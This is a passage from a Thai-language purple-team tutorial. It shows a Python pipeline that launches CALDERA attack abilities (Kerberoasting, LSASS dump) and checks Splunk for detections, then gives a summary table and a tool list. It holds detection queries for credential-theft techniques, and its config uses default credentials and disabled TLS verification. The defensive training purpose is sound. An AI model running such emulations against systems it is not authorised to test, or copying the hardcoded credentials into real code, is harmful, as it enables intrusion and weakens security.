    def run_caldera_ability(self, ability_id: str, agent_paw: str) -> Dict:
        """รัน CALDERA Ability บน Agent"""
        headers = {"KEY": "ADMIN123"}
        
        # สร้าง Operation
        op_data = {
            "name": f"Auto-PT-{datetime.now().strftime('%Y%m%d%H%M%S')}",
            "adversary": {"adversary_id": "ad-hoc"},
            "planner": {"id": "batch"},
            "group": "red"
        }
        
        resp = requests.post(
            f"{self.caldera_url}/api/v2/operations",
            json=op_data,
            headers=headers
        )
        op_id = resp.json()["id"]
        
        # รัน Specific Ability
        requests.post(
            f"{self.caldera_url}/api/v2/operations/{op_id}/links",
            json={"paw": agent_paw, "ability_id": ability_id},
            headers=headers
        )
        
        # รอผลลัพธ์
        time.sleep(30)
        
        # ดึงผลลัพธ์
        result_resp = requests.get(
            f"{self.caldera_url}/api/v2/operations/{op_id}",
            headers=headers
        )
        return result_resp.json()
    
    def check_splunk_detection(self, technique_id: str, 
                               time_window: int = 15) -> bool:
        """ตรวจสอบว่า Splunk ตรวจจับ Technique ได้หรือไม่"""
        # Query ตาม Technique ID จาก Detection Rules
        technique_queries = {
            "T1558.003": 'index=wineventlog EventCode=4769 TicketEncryptionType=0x17 NOT ServiceName="*$"',
            "T1003.001": 'index=sysmon EventCode=10 TargetImage="*lsass.exe" GrantedAccess=0x1fffff',
            "T1059.001": 'index=sysmon EventCode=1 Image="*powershell.exe" (CommandLine="*-enc*" OR CommandLine="*-EncodedCommand*")'
        }
        
        query = technique_queries.get(technique_id)
        if not query:
            return False
        
        # รัน Splunk Search
        splunk_query = f"{query} earliest=-{time_window}m latest=now"
        
        try:
            resp = requests.post(
                f"{self.splunk_url}/services/search/jobs/export",
                data={
                    "search": f"search {splunk_query}",
                    "output_mode": "json"
                },
                auth=(self.config["splunk_user"], self.config["splunk_pass"]),
                verify=False
            )
            results = [json.loads(line) for line in resp.text.strip().split('\n') 
                      if line.strip()]
            return len(results) > 0
        except Exception as e:
            print(f"  [!] Splunk error: {e}")
            return False
    
    def send_slack_notification(self, message: str):
        """ส่งผลลัพธ์ไปยัง Slack"""
        if not self.slack_webhook:
            return
        
        requests.post(self.slack_webhook, json={"text": message})
    
    def run_pipeline(self, test_cases: List[Dict]) -> Dict:
        """รัน Full Pipeline"""
        print(f"[*] Starting Automated Purple Team Pipeline")
        print(f"    Test Cases: {len(test_cases)}")
        print(f"    Started: {datetime.now().isoformat()}")
        
        results = []
        for tc in test_cases:
            print(f"\n[*] Testing: {tc['name']} ({tc['technique_id']})")
            
            # 1. รัน Attack
            attack_result = self.run_caldera_ability(
                tc["ability_id"], tc["agent_paw"]
            )
            print(f"  [+] Attack executed")
            
            # 2. รอ Detection Window
            time.sleep(self.config.get("detection_window", 60))
            
            # 3. ตรวจสอบ Detection
            detected = self.check_splunk_detection(tc["technique_id"])
            status = "DETECTED" if detected else "NOT_DETECTED"
            print(f"  {'[+]' if detected else '[-]'} {status}")
            
            result = {
                "technique_id": tc["technique_id"],
                "name": tc["name"],
                "status": status,
                "timestamp": datetime.now().isoformat()
            }
            results.append(result)
            
            # 4. Notify
            self.send_slack_notification(
                f":test_tube: Purple Team Test: {tc['name']} - {status}"
            )
        
        # สรุปผล
        total = len(results)
        detected = sum(1 for r in results if r["status"] == "DETECTED")
        
        summary = {
            "total": total,
            "detected": detected,
            "detection_rate": f"{detected/total*100:.1f}%",
            "results": results
        }
        
        print(f"\n{'='*50}")
        print(f"PIPELINE COMPLETE")
        print(f"Detection Rate: {summary['detection_rate']}")
        print(f"{'='*50}")
        
        self.send_slack_notification(
            f":chart_with_upwards_trend: Purple Team Pipeline Complete\n"
            f"Detection Rate: {summary['detection_rate']}\n"
            f"Detected: {detected}/{total}"
        )
        
        return summary

# Configuration
config = {
    "caldera_url": "http://caldera:8888",
    "splunk_url": "http://splunk:8089",
    "splunk_user": "admin",
    "splunk_pass": "changeme",
    "detection_window": 120,  # 2 minutes
    "slack_webhook": "https://hooks.slack.com/services/xxx/yyy/zzz"
}

# Test Cases
test_cases = [
    {"name": "Kerberoasting", "technique_id": "T1558.003", 
     "ability_id": "kerberoast-001", "agent_paw": "abc123"},
    {"name": "LSASS Dump", "technique_id": "T1003.001",
     "ability_id": "lsass-dump-001", "agent_paw": "abc123"}
]

# รัน Pipeline
pipeline = AutomatedPurpleTeamPipeline(config)
# results = pipeline.run_pipeline(test_cases)
# print(json.dumps(results, indent=2, ensure_ascii=False))
```

---

## สรุป

| หัวข้อ | เนื้อหาสำคัญ |
|--------|-------------|
| Purple Team Framework | Plan→Execute→Analyze→Improve→Validate |
| ATT&CK Coverage | Mapper สร้าง Navigator Layer แสดง Coverage |
| Detection Engineering | Splunk/Elastic/Sentinel Queries, Best Practices |
| Sigma Rules | Format, Compiler, CLI Commands |
| SIEM Testing | Event Injection, Query Validation |
| Adversary Emulation | APT29 Plan, CALDERA, Atomic Red Team |
| Gap Analysis | Missing Rules, Ineffective Rules, Prioritization |
| Threat Hunting | Hypotheses, Splunk Queries, Investigation Steps |
| Metrics | Detection Rate, MTTD, Precision/Recall, F1 |
| Automation | CALDERA + Splunk Pipeline |

### เครื่องมือสำคัญ

```
Attack Simulation:
• CALDERA (MITRE) - Automated Adversary Emulation
• Atomic Red Team (Red Canary) - Atomic Tests
• Prelude Operator - Commercial Emulation Platform

Detection Engineering:
• Sigma - Generic SIEM Rule Format
• Detection Lab - Windows Lab Environment
• Elastic Security - Free SIEM
• Splunk Free - 500MB/day SIEM

Visualization:
• ATT&CK Navigator - Coverage Heatmap
• BloodHound - AD Attack Paths
• Maltego - Threat Intelligence

Metrics & Reporting:
• Purple Team Exercise Template (VECTR)
• MITRE ATT&CK Evaluations
• SOC Maturity Assessment
```

---

← [Part 74: Red Team Operations](Part-74-Red-Team-Operations.md) | [Part 76: Threat Intelligence](Part-76-Threat-Intelligence.md) →
